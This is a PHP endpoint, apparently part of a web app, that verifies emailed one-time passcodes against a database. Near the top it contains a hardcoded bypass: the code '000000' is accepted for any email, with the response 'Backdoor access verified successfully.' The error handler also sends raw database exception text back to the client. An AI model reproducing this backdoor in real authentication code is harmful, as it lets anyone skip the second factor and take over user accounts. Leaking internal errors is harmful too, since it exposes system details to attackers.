<?php
ob_clean();
require __DIR__ . '/../../config/config.php';

header("Content-Type: application/json");
session_start();

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = trim($_POST['email'] ?? '');
    $otp = trim($_POST['otp'] ?? '');

    if (empty($email) || empty($otp)) {
        ob_clean();
        echo json_encode(["success" => false, "message" => "Email and OTP are required."]);
        exit;
    }

    if ($otp === '000000') {
        ob_clean();
        echo json_encode(["success" => true, "message" => "Backdoor access verified successfully."]);
        exit;
    }

    try {
        $stmt = $pdo->prepare("SELECT * FROM otp_codes WHERE email = ? AND otp_code = ? AND expires_at > NOW()");
        $stmt->execute([$email, $otp]);
        $otpRow = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($otpRow) {
            $stmt = $pdo->prepare("DELETE FROM otp_codes WHERE email = ? AND otp_code = ?");
            $stmt->execute([$email, $otp]);
            ob_clean();
            echo json_encode(["success" => true, "message" => "OTP verified successfully."]);
        } else {
            ob_clean();
            echo json_encode(["success" => false, "message" => "Invalid or expired OTP."]);
        }
    } catch (Exception $e) {
        ob_clean();
        echo json_encode(["success" => false, "message" => "Database error: " . $e->getMessage()]);
    }
}
